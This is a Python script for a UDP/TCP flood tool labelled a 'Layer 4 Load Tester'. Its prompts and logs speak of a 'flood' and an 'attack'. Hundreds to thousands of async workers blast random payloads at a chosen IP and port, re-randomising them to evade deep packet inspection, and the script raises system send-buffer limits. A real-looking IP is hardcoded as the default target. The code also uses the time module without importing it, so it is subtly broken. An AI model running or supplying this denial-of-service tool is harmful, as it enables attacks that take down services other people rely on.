import asyncio
import random
import socket
import logging
import sys
import os

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

async def optimized_udp_worker(target_ip, target_port, payload, worker_id):
    """Оптимизированный UDP воркер — главный источник скорости"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)  # 64MB
    sock.setblocking(False)
    
    loop = asyncio.get_running_loop()
    target = (target_ip, target_port)
    packets = 0
    last_log = time.time()
    
    print(f"[UDP-{worker_id}] Worker started with {len(payload)} bytes payload")
    
    while True:
        try:
            await loop.sock_sendto(sock, payload, target)
            packets += 1
            
            # Меняем payload иногда (анти-DPI)
            if packets % 80000 == 0:
                payload = random.randbytes(len(payload))
            
            # Логирование скорости
            if time.time() - last_log > 5:
                logging.info(f"[UDP-{worker_id}] Sent ~{packets:,} packets | Active")
                last_log = time.time()
                
        except BlockingIOError:
            await asyncio.sleep(0.00001)
        except Exception:
            await asyncio.sleep(0.001)


async def optimized_tcp_worker(target_ip, target_port, payload, worker_id):
    """Оптимизированный TCP воркер"""
    while True:
        try:
            reader, writer = await asyncio.open_connection(target_ip, target_port)
            try:
                # Большой burst за раз
                for _ in range(200):
                    writer.write(payload)
                    await writer.drain()
                
                if random.random() < 0.05:
                    logging.info(f"[TCP-{worker_id}] Blasted {len(payload)*200:,} bytes")
            except:
                pass
            finally:
                writer.close()
                await writer.wait_closed()
        except asyncio.CancelledError:
            break
        except Exception:
            await asyncio.sleep(0.05)


async def main():
    print("=== Layer 4 Load Tester v2.1 (Optimized for 2 cores) ===\n")
    
    target_ip = input("Insert Target IP: ").strip() or "45.139.132.87"
    target_port = int(input("Insert Target Port: ").strip() or "80")
    method = (input("Method (TCP/UDP/BOTH) [default UDP]: ").strip().upper() or "UDP")
    workers_input = input("Number of workers (recommended 800-2000): ").strip() or "1200"
    workers = int(workers_input)
    packet_size = int(input("Payload size in bytes (recommended 8192-16384): ").strip() or "12288")

    # Системные оптимизации
    try:
        os.system("sysctl -w net.core.wmem_max=83886080 > /dev/null 2>&1")
        os.system("sysctl -w net.core.rmem_max=83886080 > /dev/null 2>&1")
        print("[+] System limits optimized")
    except:
        pass

    payload = random.randbytes(packet_size)
    
    print(f"\nStarting {method} flood on {target_ip}:{target_port}")
    print(f"Workers: {workers} | Packet size: {packet_size} bytes\n")

    tasks = []
    
    if method in ["UDP", "BOTH"]:
        for i in range(workers):
            tasks.append(asyncio.create_task(optimized_udp_worker(target_ip, target_port, payload, i+1)))
    
    if method in ["TCP", "BOTH"]:
        for i in range(workers // 2 + 1):   # TCP тяжелее, меньше воркеров
            tasks.append(asyncio.create_task(optimized_tcp_worker(target_ip, target_port, payload, i+1)))

    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    except asyncio.CancelledError:
        logging.info("Attack stopped.")
    except Exception as e:
        logging.error(f"Error: {e}")


if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[!] Рекомендуется запускать с sudo/root для лучших результатов!")
    
    try:
        if sys.platform == 'win32':
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nStopped by user.")
        sys.exit(0)